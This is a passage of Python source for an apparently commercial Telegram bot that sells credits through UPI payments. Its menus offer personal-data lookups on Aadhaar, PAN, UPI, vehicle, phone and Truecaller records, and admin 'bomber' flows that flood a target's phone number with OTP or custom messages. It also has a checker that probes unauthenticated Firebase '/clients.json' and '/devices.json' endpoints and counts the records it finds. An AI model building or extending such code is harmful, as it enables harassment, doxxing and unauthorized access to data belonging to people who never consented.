    await send_auto(update.message,f"🎰 <b>+{won} Credits!</b>\nBalance: {u.get('credits',0)}",parse_mode="HTML")

async def cmd_redeem(update,context):
    if not await check_access(update,context): return
    user=update.effective_user; args=update.message.text.split()[1:]
    if not args:
        await send_auto(update.message,"❌ <code>/redeem CODE</code>",parse_mode="HTML"); return
    code=args[0].strip().upper(); u=db.get_user(user.id,user.first_name,user.username)
    nc=db.data.get("redeem_codes",{}); vc=db.data.get("vip_redeem_codes",{})
    if code in nc and nc[code].get("uses",0)>0:
        if user.id in nc[code].get("claimed_by",[]):
            await send_auto(update.message,"❌ Already claimed."); return
        amt=nc[code]["credits"]
        if not db.is_free_tier(user.id): u["credits"]=u.get("credits",0)+amt
        nc[code]["uses"]-=1; nc[code].setdefault("claimed_by",[]).append(user.id); db.save()
        await send_auto(update.message,f"🎉 <b>+{amt} Credits!</b>",parse_mode="HTML")
    elif code in vc and vc[code].get("uses",0)>0:
        if user.id in vc[code].get("claimed_by",[]):
            await send_auto(update.message,"❌ Already claimed."); return
        days=vc[code]["days"]
        if user.id not in db.data["private_whitelist"]: db.data["private_whitelist"].append(user.id)
        u["premium"]=True; u["credits"]=999999999
        vc[code]["uses"]-=1; vc[code].setdefault("claimed_by",[]).append(user.id); db.save()
        await send_auto(update.message,f"💎 <b>VIP {days} days!</b>",parse_mode="HTML")
    else: await send_auto(update.message,"❌ Invalid/expired.")

async def cmd_referral(update,context):
    if not await check_access(update,context): return
    user=update.effective_user; u=db.get_user(user.id,user.first_name,user.username)
    link=f"https://t.me/{BOT_USERNAME}?start={u.get('refer_code')}"
    await send_auto(update.message,f"🔗 <b>Referral</b>\n<code>{link}</code>\n\nInvited: {u.get('referrals',0)}",parse_mode="HTML")

async def cmd_premium(update,context):
    if not await check_access(update,context): return
    user=update.effective_user; u=db.get_user(user.id,user.first_name,user.username)
    if u.get("premium") or db.is_free_tier(user.id):
        await send_auto(update.message,"✅ Already Premium!"); return
    text=(f"💎 <b>PREMIUM REQ</b>\n\n👤 {html_escape(user.first_name)}\n🆔 <code>{user.id}</code>\n📛 @{user.username or 'N/A'}\n⏰ {datetime.datetime.now().strftime('%Y-%m-%d %H:%M')}")
    try:
        await context.bot.send_message(MAIN_OWNER,text,parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("✅ Approve",callback_data=f"prem_approve_{user.id}"),InlineKeyboardButton("❌ Deny",callback_data=f"prem_deny_{user.id}")]]))
        await send_auto(update.message,"✅ Sent to owner!")
    except Exception as e: await send_auto(update.message,f"❌ {e}")

async def is_tg_admin(update,context):
    user=update.effective_user
    if user.id==MAIN_OWNER: return True
    try:
        m=await context.bot.get_chat_member(update.effective_chat.id,user.id)
        return m.status in ["administrator","creator"]
    except: return False

# FIX: PTB v20+ compatible ChatPermissions
async def cmd_mute(update,context):
    if not await is_tg_admin(update,context) or not update.message.reply_to_message: return
    t=update.message.reply_to_message.from_user
    try:
        await context.bot.restrict_chat_member(
            update.effective_chat.id, t.id,
            permissions=ChatPermissions(can_send_messages=False)
        )
        await send_auto(update.message,f"🔇 Muted {t.first_name}")
    except Exception as e: await send_auto(update.message,f"Error: {e}")

async def cmd_unmute(update,context):
    if not await is_tg_admin(update,context) or not update.message.reply_to_message: return
    t=update.message.reply_to_message.from_user
    try:
        await context.bot.restrict_chat_member(
            update.effective_chat.id, t.id,
            permissions=ChatPermissions(
                can_send_messages=True,
                can_send_audios=True,
                can_send_documents=True,
                can_send_photos=True,
                can_send_videos=True,
                can_send_video_notes=True,
                can_send_voice_notes=True,
                can_send_polls=True,
                can_send_other_messages=True,
                can_add_web_page_previews=True,
            )
        )
        await send_auto(update.message,f"🔊 Unmuted {t.first_name}")
    except Exception as e: await send_auto(update.message,f"Error: {e}")

async def cmd_ban(update,context):
    if not await is_tg_admin(update,context) or not update.message.reply_to_message: return
    t=update.message.reply_to_message.from_user
    try:
        await context.bot.ban_chat_member(update.effective_chat.id,t.id)
        await send_auto(update.message,f"🚫 Banned {t.first_name}")
    except Exception as e: await send_auto(update.message,f"Error: {e}")

async def cmd_unban(update,context):
    if not await is_tg_admin(update,context) or not update.message.reply_to_message: return
    t=update.message.reply_to_message.from_user
    try:
        await context.bot.unban_chat_member(update.effective_chat.id,t.id)
        await send_auto(update.message,f"✅ Unbanned {t.first_name}")
    except Exception as e: await send_auto(update.message,f"Error: {e}")

# ==================== UNIFIED TEXT ====================
async def unified_text(update,context):
    user=update.effective_user; text=(update.message.text or "").strip()
    if not text: return
    
    # Payment screenshot state
    if context.user_data.get("waiting_for","").startswith("payment_screenshot_"):
        await send_auto(update.message,"📸 Screenshot PHOTO bhejo, text nahi! Ya /cancel karo.",parse_mode="HTML")
        return

    # OSINT input state (For everyone)
    waiting=context.user_data.get("waiting_for")
    if waiting and waiting.startswith("osint_input_"):
        if not await check_access(update,context): return
        cmd=waiting.replace("osint_input_",""); context.user_data["waiting_for"]=None
        await execute_osint(update,context,cmd,text)
        return

    # Check access for everything else
    if not await check_access(update,context): return

    # Admin Auto-add Firebase
    if db.is_admin(user.id) and any(ext in text.lower() for ext in [".firebaseio.com",".web.app",".firebaseapp.com"]):
        norm=fb_manager.norm(text)
        if norm:
            label=fb_manager.add(norm)
            if label: await send_auto(update.message,f"🔥 <b>AUTO-ADDED</b>\n🏷️ {label}\n📊 Total: {len(fb_manager.fbs)}",parse_mode="HTML")
            else: await send_auto(update.message,"⚠️ Already exists.")
            return

    # ================= USER BUTTONS (Everyone) =================
    if text=="❓ HELP": return await cmd_help(update,context)
    if text=="💰 MY CREDITS": return await cmd_credits(update,context)
    if text=="📊 MY STATS": return await cmd_stats(update,context)
    if text=="🎁 DAILY SPIN": return await cmd_spin(update,context)
    if text=="💲 BUY CREDITS": return await cmd_plans(update,context)
    if text=="🔗 REFERRAL": return await cmd_referral(update,context)
    
    osint_map={"🔍 NUM LOOKUP":"num","🚘 VEHICLE":"vehicle","🔥 FREE FIRE":"ff","🎯 BGMI":"bgmi","🪪 AADHAR":"aadhar","📄 PAN":"pan","💸 UPI":"upi","🏦 IFSC":"ifsc","🌐 IP TRACE":"ip","📞 TRUECALLER":"truecaller","📸 INSTAGRAM":"insta","🎨 AI IMAGE":"img"}
    if text in osint_map:
        cmd=osint_map[text]; context.user_data["waiting_for"]=f"osint_input_{cmd}"
        await send_auto(update.message,f"🎯 <b>{MODULE_NAMES.get(cmd,cmd)}</b>\n\n<b>{OSINT_HINTS[cmd]}</b> type karo:",parse_mode="HTML"); return

    # ================= ADMIN BUTTONS (Admin Only) =================
    if db.is_admin(user.id):
        if text=="🔴 ADMIN PANEL": return await cmd_panel(update,context)
        if text=="🟢 START BOMB":
            context.user_data["waiting_for"]="bomb_phone"
            await send_auto(update.message,"Send phone (10 digits):"); return
        if text=="🔴 STOP BOMB": return await cmd_stop(update,context)
        if text=="😈 CUSTOM BOMBER": return await cmd_custombomb(update,context)
        if text=="📢 FORCE JOIN": await send_auto(update.message,"📢 <b>FORCE JOIN</b>",reply_markup=channels_manager_kb(),parse_mode="HTML"); return
        if text=="🔥 FIREBASE": await send_auto(update.message,"🔥 <b>FIREBASE</b>",reply_markup=firebase_manager_kb(),parse_mode="HTML"); return
        if text=="💰 CREDITS": await send_auto(update.message,"💰 <b>CREDITS</b>",reply_markup=credit_manager_kb(),parse_mode="HTML"); return
        if text=="🎟 REDEEM": await send_auto(update.message,"🎟 <b>REDEEM</b>",reply_markup=redeem_manager_kb(),parse_mode="HTML"); return
        if text=="📡 BROADCAST":
            context.user_data["waiting_for"]="broadcast_media"
            await send_auto(update.message,"📡 Send media+caption OR text:",parse_mode="HTML"); return
        if text=="🔒 LOCK/UNLOCK":
            global BOT_LOCKED; BOT_LOCKED=not BOT_LOCKED
            await send_auto(update.message,f"Bot: {'🔒 LOCKED' if BOT_LOCKED else '🟢 UNLOCKED'}"); return
        if text=="⚙️ COMMANDS":
            kb,cur,tot=cmd_settings_kb(0); await send_auto(update.message,f"⚙️ ({cur}/{tot})",reply_markup=kb,parse_mode="HTML"); return
        if text=="👑 ADMINS": await send_auto(update.message,"👑 <b>ADMINS</b>",reply_markup=admins_kb(),parse_mode="HTML"); return
        if text=="📋 USERS":
            kb,cur,tot,total=users_list_kb(0); await send_auto(update.message,f"📋 Users ({total}) {cur}/{tot}",reply_markup=kb,parse_mode="HTML"); return
        if text=="🌐 API MANAGER":
            kb,cur,tot,total=api_manager_kb(0); await send_auto(update.message,f"🌐 APIs ({total}) {cur}/{tot}",reply_markup=kb,parse_mode="HTML"); return
        if text=="💎 WHITELIST": await send_auto(update.message,"💎 <b>WHITELIST</b>",reply_markup=whitelist_kb(),parse_mode="HTML"); return
        if text=="🚫 BANNED LIST":
            b=db.data.get("banned_users",[])
            await send_auto(update.message,"🚫 <b>BANNED</b>\n\n"+("\n".join(f"• <code>{x}</code>" for x in b) if b else "None"),parse_mode="HTML"); return

    # ================= FLOW STATES =================
    if waiting=="bomb_phone":
        phone=text.replace("+","").replace(" ","").strip()
        if not phone.isdigit() or len(phone)<10:
            await send_auto(update.message,"❌ Invalid."); return
        if phone in db.data.get("protected_numbers",[]):
            await send_auto(update.message,"🔒 Protected."); context.user_data["waiting_for"]=None; return
        context.user_data["pending_phone"]=phone; context.user_data["pending_mode"]="otp"
        context.user_data["waiting_for"]=None
        await show_duration_buttons(update,context,phone,"otp"); return
    if waiting=="custombomb_phone":
        phone=text.replace("+","").replace(" ","").strip()
        if not phone.isdigit() or len(phone)<10:
            await send_auto(update.message,"❌ Invalid:"); return
        context.user_data["pending_phone"]=phone
        context.user_data["pending_mode"]="custom"
        context.user_data["waiting_for"]="custombomb_msg"
        await send_auto(update.message,"✅ Custom message type karo:"); return
    if waiting=="custombomb_msg":
        context.user_data["custom_msg"]=text; phone=context.user_data.get("pending_phone")
        context.user_data["waiting_for"]=None
        await show_duration_buttons(update,context,phone,"custom"); return

    # Admin States
    if db.is_admin(user.id):
        if waiting=="broadcast_media": await do_broadcast_text(update,context,text); return
        if waiting=="ch_add":
            ch=text.lstrip("@").strip()
            if ch and ch not in db.data["force_join_channels"]:
                db.data["force_join_channels"].append(ch); db.save()
                await send_auto(update.message,f"✅ @{ch} added.")
            else: await send_auto(update.message,"❌ Invalid/dup.")
            context.user_data["waiting_for"]=None; return
        if waiting=="fb_add":
            lbl=fb_manager.add(text); context.user_data["waiting_for"]=None
            if lbl: await send_auto(update.message,f"✅ {lbl}")
            else: await send_auto(update.message,"❌ Invalid/exists."); return
        if waiting=="fb_check_url":
            context.user_data["waiting_for"]=None; await run_firebase_check(update,context,[text]); return
        if waiting=="adm_add":
            try:
                uid=int(text)
                if uid not in db.data["admins"]:
                    db.data["admins"].append(uid); db.save()
                    await send_auto(update.message,f"✅ {uid} admin.")
                else: await send_auto(update.message,"Already.")
            except: await send_auto(update.message,"❌ Invalid.")
            context.user_data["waiting_for"]=None; return
        if waiting=="cred_add_all":
            try:
                amt=int(text)
                for u in db.data["users"].values(): u["credits"]=u.get("credits",0)+amt
                db.save(); await send_auto(update.message,f"✅ +{amt} to all.")
            except: await send_auto(update.message,"❌ Invalid.")
            context.user_data["waiting_for"]=None; return
        if waiting=="cred_ded_all":
            try:
                amt=int(text)
                for u in db.data["users"].values(): u["credits"]=max(0,u.get("credits",0)-amt)
                db.save(); await send_auto(update.message,f"✅ -{amt} from all.")
            except: await send_auto(update.message,"❌ Invalid.")
            context.user_data["waiting_for"]=None; return
        if waiting=="cred_add_one_uid":
            try:
                context.user_data["credit_uid"]=int(text); context.user_data["waiting_for"]="cred_add_one_amt"
                await send_auto(update.message,"Amount:")
            except: await send_auto(update.message,"❌ Invalid."); return
        if waiting=="cred_add_one_amt":
            try:
                amt=int(text); uid=context.user_data.pop("credit_uid")
                u=db.get_user(uid); u["credits"]=u.get("credits",0)+amt; db.save()
                await send_auto(update.message,f"✅ +{amt} to {uid}.")
            except: await send_auto(update.message,"❌ Invalid.")
            context.user_data["waiting_for"]=None; return
        if waiting=="cred_ded_one_uid":
            try:
                context.user_data["credit_uid"]=int(text); context.user_data["waiting_for"]="cred_ded_one_amt"
                await send_auto(update.message,"Amount:")
            except: await send_auto(update.message,"❌ Invalid."); return
        if waiting=="cred_ded_one_amt":
            try:
                amt=int(text); uid=context.user_data.pop("credit_uid")
                u=db.get_user(uid); u["credits"]=max(0,u.get("credits",0)-amt); db.save()
                await send_auto(update.message,f"✅ -{amt} from {uid}.")
            except: await send_auto(update.message,"❌ Invalid.")
            context.user_data["waiting_for"]=None; return
        if waiting=="red_normal_amt":
            try:
                context.user_data["red_amt"]=int(text); context.user_data["waiting_for"]="red_normal_uses"
                await send_auto(update.message,"Max uses:")
            except: await send_auto(update.message,"❌ Invalid."); return
        if waiting=="red_normal_uses":
            try:
                uses=int(text); amt=context.user_data.pop("red_amt")
                code="AYUSH-"+"".join(random.choices(string.ascii_uppercase+string.digits,k=8))
                db.data.setdefault("redeem_codes",{})[code]={"credits":amt,"uses":uses,"claimed_by":[]}
                db.save()
                await send_auto(update.message,f"🎁 <b>NORMAL</b>\n<code>{code}</code>\n{amt}cr | {uses} uses",parse_mode="HTML")
            except: await send_auto(update.message,"❌ Invalid.")
            context.user_data["waiting_for"]=None; return
        if waiting=="red_vip_days":
            try:
                days=int(text)
                code="VIP-"+"".join(random.choices(string.ascii_uppercase+string.digits,k=8))
                db.data.setdefault("vip_redeem_codes",{})[code]={"days":days,"uses":1,"claimed_by":[]}
                db.save()
                await send_auto(update.message,f"💎 <b>VIP</b>\n<code>{code}</code>\n{days} days",parse_mode="HTML")
            except: await send_auto(update.message,"❌ Invalid.")
            context.user_data["waiting_for"]=None; return
        if waiting=="cmd_setcost":
            try:
                amt=int(text); cmd=context.user_data.pop("cmd_cfg_target")
                db.get_cmd_config(cmd)["cost"]=amt; db.save()
                await send_auto(update.message,f"✅ /{cmd} = {amt}")
            except: await send_auto(update.message,"❌ Invalid.")
            context.user_data["waiting_for"]=None; return
        if waiting=="api_edit_url":
            cmd=context.user_data.pop("api_edit_target")
            if "{arg}" not in text:
                await send_auto(update.message,"❌ Must include {arg}. Send again:")
                context.user_data["waiting_for"]="api_edit_url"; context.user_data["api_edit_target"]=cmd
                return
            custom={}
            if API_CONFIG_FILE.exists():
                try:
                    with open(API_CONFIG_FILE,"r",encoding="utf-8") as f: custom=json.load(f)
                except: pass
            custom[cmd]=text.strip()
            with open(API_CONFIG_FILE,"w",encoding="utf-8") as f: json.dump(custom,f,indent=2)
            context.user_data["waiting_for"]=None
            await send_auto(update.message,f"✅ /{cmd} updated."); return
        if waiting=="api_add_pair":
            parts=text.split(maxsplit=1)
            if len(parts)<2 or "{arg}" not in parts[1]:
                await send_auto(update.message,"❌ Format: cmd URL_with_{arg}"); return
            cmd=parts[0].lstrip("/").lower(); url=parts[1].strip()
            custom={}
            if API_CONFIG_FILE.exists():
                try:
                    with open(API_CONFIG_FILE,"r",encoding="utf-8") as f: custom=json.load(f)
                except: pass
            custom[cmd]=url
            with open(API_CONFIG_FILE,"w",encoding="utf-8") as f: json.dump(custom,f,indent=2)
            context.user_data["waiting_for"]=None
            await send_auto(update.message,f"✅ /{cmd} added."); return
        if waiting=="wl_add":
            try:
                uid=int(text)
                if uid not in db.data["private_whitelist"]:
                    db.data["private_whitelist"].append(uid); db.save()
                    db.get_user(uid)["credits"]=999999999; db.save()
                    await send_auto(update.message,f"✅ {uid} whitelisted.")
                else: await send_auto(update.message,"Already.")
            except: await send_auto(update.message,"❌ Invalid.")
            context.user_data["waiting_for"]=None; return
        if waiting=="prot_add":
            num=text.replace("+","").replace(" ","").strip()
            if num.isdigit() and len(num)>=10:
                if num not in db.data["protected_numbers"]:
                    db.data["protected_numbers"].append(num); db.save()
                    await send_auto(update.message,f"✅ {num} protected.")
                else: await send_auto(update.message,"Already.")
            else: await send_auto(update.message,"❌ Invalid.")
            context.user_data["waiting_for"]=None; return
        if waiting=="set_upi_id":
            upi=text.strip()
            if "@" not in upi:
                await send_auto(update.message,"❌ Invalid UPI (must have @). Try again:"); return
            db.data["upi_id"]=upi; db.save()
            await send_auto(update.message,f"✅ UPI: <code>{upi}</code>",parse_mode="HTML")
            context.user_data["waiting_for"]=None; return
        if waiting=="plan_add_name":
            context.user_data["plan_temp"]={"name":text.strip()}
            context.user_data["waiting_for"]="plan_add_price"
            await send_auto(update.message,"✅ Name set.\n\nSend PRICE (₹, e.g. 49):"); return
        if waiting=="plan_add_price":
            try:
                price=int(text.strip())
                if price<=0: raise ValueError
                context.user_data["plan_temp"]["price"]=price
                context.user_data["waiting_for"]="plan_add_credits"
                await send_auto(update.message,"✅ Price set.\n\nSend CREDITS amount:")
            except: await send_auto(update.message,"❌ Invalid price:")
            return
        if waiting=="plan_add_credits":
            try:
                credits=int(text.strip())
                if credits<=0: raise ValueError
                pd=context.user_data.pop("plan_temp"); pd["credits"]=credits
                pd["id"]=f"p{int(time.time())}_{random.randint(100,999)}"
                db.data.setdefault("plans",[]).append(pd); db.save()
                context.user_data["waiting_for"]=None
                await send_auto(update.message,f"✅ <b>PLAN ADDED!</b>\n\n⭐ {pd['name']}\n💵 ₹{pd['price']}\n🎁 {pd['credits']}cr",parse_mode="HTML")
            except: await send_auto(update.message,"❌ Invalid credits:")
            return
        if waiting=="plan_editname":
            pid=context.user_data.pop("plan_edit_target",None)
            plan=next((p for p in db.data.get("plans",[]) if p["id"]==pid),None)
            if plan:
                plan["name"]=text.strip(); db.save()
                await send_auto(update.message,f"✅ {plan['name']}")
            else: await send_auto(update.message,"❌ Not found.")
            context.user_data["waiting_for"]=None; return
        if waiting=="plan_editprice":
            try:
                price=int(text.strip()); pid=context.user_data.pop("plan_edit_target",None)
                plan=next((p for p in db.data.get("plans",[]) if p["id"]==pid),None)
                if plan: plan["price"]=price; db.save(); await send_auto(update.message,f"✅ ₹{price}")
            except: await send_auto(update.message,"❌ Invalid.")
            context.user_data["waiting_for"]=None; return
        if waiting=="plan_editcredits":
            try:
                cr=int(text.strip()); pid=context.user_data.pop("plan_edit_target",None)
                plan=next((p for p in db.data.get("plans",[]) if p["id"]==pid),None)
                if plan: plan["credits"]=cr; db.save(); await send_auto(update.message,f"✅ {cr}cr")
            except: await send_auto(update.message,"❌ Invalid.")
            context.user_data["waiting_for"]=None; return

async def unified_media(update,context):
    user=update.effective_user; msg=update.message; waiting=context.user_data.get("waiting_for")
    if waiting and waiting.startswith("payment_screenshot_"):
        pid=waiting.replace("payment_screenshot_","")
        if not msg.photo:
            await send_auto(update.message,"❌ Screenshot PHOTO bhejo."); return
        plan=next((p for p in db.data.get("plans",[]) if p["id"]==pid),None)
        if not plan:
            await send_auto(update.message,"❌ Plan removed. Contact owner.")
            context.user_data["waiting_for"]=None; return
        fid=msg.photo[-1].file_id
        pay_id=f"pay{int(time.time())}_{user.id}"
        db.data.setdefault("pending_payments",{})[pay_id]={
            "user_id":user.id,"username":user.username or "","name":user.first_name or "User",
            "plan_id":plan["id"],"plan_name":plan["name"],"price":plan["price"],"credits":plan["credits"],
            "screenshot":fid,"timestamp":int(time.time()),"status":"pending"}
        db.save()
        try:
            await context.bot.send_photo(MAIN_OWNER,fid,
                caption=(f"💰 <b>PAYMENT REQUEST</b>\n\n👤 {html_escape(user.first_name)}\n📛 @{user.username or 'N/A'}\n🆔 <code>{user.id}</code>\n\n"
                        f"📦 {plan['name']}\n💵 ₹{plan['price']}\n🎁 {plan['credits']}cr\n"
                        f"⏰ {datetime.datetime.now().strftime('%Y-%m-%d %H:%M')}\n🆔 <code>{pay_id}</code>"),
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("✅ Approve",callback_data=f"pay_approve_{pay_id}"),InlineKeyboardButton("❌ Reject",callback_data=f"pay_reject_{pay_id}")]]),
                parse_mode="HTML")
            await send_auto(update.message,"✅ <b>Screenshot sent!</b>\n\nOwner verify karega, credits milenge. ⏳",parse_mode="HTML")
        except Exception as e: await send_auto(update.message,f"❌ {e}")
        context.user_data["waiting_for"]=None; return
    if not db.is_admin(user.id): return
    if waiting=="broadcast_media":
        caption=msg.caption or ""; success=0; fail=0
        status=await msg.reply_text("📡 Broadcasting...",parse_mode="HTML")
        for uid_s in list(db.data["users"].keys()):
            try:
                uid=int(uid_s)
                if msg.photo: await context.bot.send_photo(uid,msg.photo[-1].file_id,caption=caption,parse_mode="HTML")
                elif msg.video: await context.bot.send_video(uid,msg.video.file_id,caption=caption,parse_mode="HTML")
                elif msg.audio: await context.bot.send_audio(uid,msg.audio.file_id,caption=caption,parse_mode="HTML")
                elif msg.document: await context.bot.send_document(uid,msg.document.file_id,caption=caption,parse_mode="HTML")
                elif msg.sticker: await context.bot.send_sticker(uid,msg.sticker.file_id)
                elif msg.voice: await context.bot.send_voice(uid,msg.voice.file_id,caption=caption,parse_mode="HTML")
                elif msg.animation: await context.bot.send_animation(uid,msg.animation.file_id,caption=caption,parse_mode="HTML")
                success+=1
            except: fail+=1
        try: await status.edit_text(f"✅ {success} | ❌ {fail}")
        except: pass
        context.user_data["waiting_for"]=None
        asyncio.create_task(_del_later(status)); return
    if msg.document and msg.document.file_name and msg.document.file_name.endswith(".txt"):
        if waiting in ("fb_check_file","fb_bulk"):
            file=await msg.document.get_file(); data=await file.download_as_bytearray()
            lines=[l.strip() for l in data.decode("utf-8",errors="ignore").splitlines() if l.strip()]
            context.user_data["waiting_for"]=None
            if waiting=="fb_check_file": await run_firebase_check(update,context,lines)
            else:
                added=fb_manager.bulk_add(lines)
                await send_auto(update.message,f"📁 {added} added. Total: {len(fb_manager.fbs)}")
            return

async def do_broadcast_text(update,context,text):
    success=0; fail=0
    status=await update.message.reply_text("📡 Broadcasting...",parse_mode="HTML")
    for uid_s in list(db.data["users"].keys()):
        try: await context.bot.send_message(int(uid_s),text,parse_mode="HTML"); success+=1
        except: fail+=1
    try: await status.edit_text(f"✅ {success} | ❌ {fail}")
    except: pass
    context.user_data["waiting_for"]=None
    asyncio.create_task(_del_later(status))

async def run_firebase_check(update,context,urls):
    s=await get_http_session(); active=0; offline=0; details=[]
    for url in urls:
        url=url.strip()
        if not url or not any(x in url for x in [".com",".app",".io","firebase"]): continue
        base=fb_manager.norm(url).rstrip("/"); found=False
        for path in ["/clients.json?shallow=true","/devices.json?shallow=true"]:
            try:
                async with s.get(base+path,timeout=aiohttp.ClientTimeout(total=10)) as r:
                    if r.status==200:
                        txt=await r.text()
                        if txt and txt!="null" and txt.startswith("{"):
                            data=json.loads(txt)
                            if isinstance(data,dict):
                                cnt=len([k for k in data.keys() if not k.startswith("$")])
                                if cnt>0:
                                    active+=cnt; details.append(f"✅ {base[:35]} — {cnt}"); found=True; break
            except: pass
        if not found:
            offline+=1; details.append(f"❌ {base[:35]} — offline")
    await send_auto(update.message,f"🔥 <b>FIREBASE</b>\n\n✅ Active: {active}\n❌ Offline: {offline}\n\n"+"\n".join(details[:20]),parse_mode="HTML")

# ==================== CALLBACKS ====================
# FIX: Removed top-level q.answer() — now uses `ans()` flag pattern to prevent double-answer crashes
# FIX: All show_alert branches now correctly show alerts
async def callback_router(update,context):
    global BOT_LOCKED
    q=update.callback_query
    data=q.data; user=q.from_user

    # Safe answer pattern — only first call wins, prevents double-answer crashes
    _answered = [False]
    async def ans(text=None, show_alert=False):
        if _answered[0]: return
        _answered[0] = True
        try:
            if text is None: await q.answer()
            else: await q.answer(text, show_alert=show_alert)
        except Exception as e:
            logger.debug(f"answer err: {e}")

    if data=="noop":
        await ans(); return
    if data=="verify_join":
        missing=[]
        for ch in db.data.get("force_join_channels",[]):
            try:
                m=await context.bot.get_chat_member(f"@{ch}",user.id)
                if m.status not in ["member","administrator","creator"]: missing.append(ch)
            except: missing.append(ch)
        if not missing: await edit_auto(q,"✅ All joined! /help karo.")
        else: await edit_auto(q,f"❌ Missing: {', '.join('@'+c for c in missing)}")
        return
    if data.startswith("prem_approve_"):
        if user.id!=MAIN_OWNER:
            await ans("Only owner!",show_alert=True); return
        uid=int(data.replace("prem_approve_",""))
        if uid not in db.data["private_whitelist"]: db.data["private_whitelist"].append(uid)
        u=db.get_user(uid); u["premium"]=True; u["credits"]=999999999; db.save()
        try: await context.bot.send_message(uid,"✅ Approved!")
        except: pass
        await edit_auto(q,"✅ Approved."); return
    if data.startswith("prem_deny_"):
        if user.id!=MAIN_OWNER:
            await ans("Only owner!",show_alert=True); return
        uid=int(data.replace("prem_deny_",""))
        try: await context.bot.send_message(uid,"❌ Denied.")
        except: pass
        await edit_auto(q,"Denied."); return
    if not db.is_admin(user.id) and not data.startswith(("osint_","bmb_","buy_plan_")):
        await ans(); return

    # Buy plan (anyone can)
    if data.startswith("buy_plan_"):
        pid=data.replace("buy_plan_","")
        existing=context.user_data.get("waiting_for","")
        if existing.startswith("payment_screenshot_"):
            old_pid=existing.replace("payment_screenshot_","")
            old_plan=next((p for p in db.data.get("plans",[]) if p["id"]==old_pid),None)
            if old_plan:
                await ans(f"⚠️ Pehle {old_plan['name']} ka screenshot bhejo!",show_alert=True)
                return
        plan=next((p for p in db.data.get("plans",[]) if p["id"]==pid),None)
        if not plan:
            await ans("Plan not found!",show_alert=True); return
        upi=db.data.get("upi_id","").strip()
        if not upi:
            await ans(f"❌ UPI not set. Contact @{OWNER_USERNAME}",show_alert=True); return
        await ans()
        context.user_data["waiting_for"]=f"payment_screenshot_{pid}"
        upi_pay_url=f"upi://pay?pa={upi}&pn=Ayush&am={plan['price']}&cu=INR"
        qr_img_url=f"https://api.qrserver.com/v1/create-qr-code/?size=400x400&data={quote(upi_pay_url)}"
        caption=(f"💳 <b>{plan['name'].upper()}</b>\n\n💰 ₹{plan['price']}\n🎁 {plan['credits']} credits\n\n"
                f"📲 <b>UPI:</b> <code>{upi}</code>\n\n<b>Steps:</b>\n1️⃣ Scan QR or pay to UPI\n2️⃣ Screenshot lo\n3️⃣ Screenshot BOT ko bhejo\n\n⚠️ Owner verify karega")
        try: await q.message.reply_photo(photo=qr_img_url,caption=caption,parse_mode="HTML")
        except: await q.message.reply_text(caption,parse_mode="HTML")
        try: await q.message.delete()
        except: pass
        return

    # Payment approve/reject — single alert answer, then edit
    if data.startswith("pay_approve_"):
        if user.id!=MAIN_OWNER:
            await ans("Only owner!",show_alert=True); return
        pid=data.replace("pay_approve_","")
        p=db.data.get("pending_payments",{}).get(pid)
        if not p or p.get("status")!="pending":
            await ans("Already processed!",show_alert=True); return
        p["status"]="approved"
        tu=db.get_user(p["user_id"])
        tu["credits"]=tu.get("credits",0)+p["credits"]; db.save()
        try:
            await context.bot.send_message(p["user_id"],
                f"✅ <b>PAYMENT APPROVED!</b>\n\n📦 {p['plan_name']}\n💵 ₹{p['price']}\n🎁 +{p['credits']} credits\n\n💰 Balance: <code>{tu['credits']}</code>",parse_mode="HTML")
        except: pass
        await ans(f"✅ +{p['credits']} credits added!",show_alert=True)
        try: await q.edit_message_reply_markup(reply_markup=None)
        except: pass
        return
    if data.startswith("pay_reject_"):
        if user.id!=MAIN_OWNER:
            await ans("Only owner!",show_alert=True); return
        pid=data.replace("pay_reject_","")
        p=db.data.get("pending_payments",{}).get(pid)
        if not p or p.get("status")!="pending":
            await ans("Already processed!",show_alert=True); return
        p["status"]="rejected"; db.save()
        try:
            await context.bot.send_message(p["user_id"],
                f"❌ <b>PAYMENT REJECTED</b>\n\n{p['plan_name']}\n₹{p['price']}\n\nContact @{OWNER_USERNAME}",parse_mode="HTML")
        except: pass
        await ans("❌ Rejected.",show_alert=True)
        try: await q.edit_message_reply_markup(reply_markup=None)
        except: pass
        return

    # Plans manager
    if data=="ap_plans": await show_plans_manager(q); return
    if data=="ap_setupi":
        context.user_data["waiting_for"]="set_upi_id"
        await edit_auto(q,f"💳 Current: <code>{db.data.get('upi_id','not set')}</code>\n\nSend new UPI ID:",parse_mode="HTML"); return
    if data=="plan_add":
        context.user_data["waiting_for"]="plan_add_name"
        await edit_auto(q,"➕ <b>NEW PLAN</b>\n\nStep 1: Plan NAME:"); return
    if data.startswith("plan_edit_"):
        pid=data.replace("plan_edit_","")
        plan=next((p for p in db.data.get("plans",[]) if p["id"]==pid),None)
        if not plan:
            await ans("Not found!",show_alert=True); return
        kb=[[InlineKeyboardButton("✏️ Name",callback_data=f"plan_editname_{pid}")],
            [InlineKeyboardButton("💵 Price",callback_data=f"plan_editprice_{pid}")],
            [InlineKeyboardButton("🎁 Credits",callback_data=f"plan_editcredits_{pid}")],
            [InlineKeyboardButton("🔙 Back",callback_data="ap_plans")]]
        await edit_auto(q,f"✏️ {plan['name']}\n₹{plan['price']} | {plan['credits']}cr",reply_markup=InlineKeyboardMarkup(kb),parse_mode="HTML"); return
    if data.startswith("plan_editname_"):
        pid=data.replace("plan_editname_","")
        context.user_data["waiting_for"]="plan_editname"; context.user_data["plan_edit_target"]=pid
        await edit_auto(q,"New NAME:"); return
    if data.startswith("plan_editprice_"):
        pid=data.replace("plan_editprice_","")
        context.user_data["waiting_for"]="plan_editprice"; context.user_data["plan_edit_target"]=pid
        await edit_auto(q,"New PRICE:"); return
    if data.startswith("plan_editcredits_"):
        pid=data.replace("plan_editcredits_","")
        context.user_data["waiting_for"]="plan_editcredits"; context.user_data["plan_edit_target"]=pid
        await edit_auto(q,"New CREDITS:"); return
    if data.startswith("plan_del_"):
        pid=data.replace("plan_del_","")
        db.data["plans"]=[p for p in db.data.get("plans",[]) if p["id"]!=pid]; db.save()
        await show_plans_manager(q); return
    if data=="ap_pending":
        pending={k:v for k,v in db.data.get("pending_payments",{}).items() if v.get("status")=="pending"}
        if not pending:
            await edit_auto(q,"✅ No pending.",reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back",callback_data="ap_back")]])); return
        kb=[]
        for pid,p in list(pending.items())[:15]:
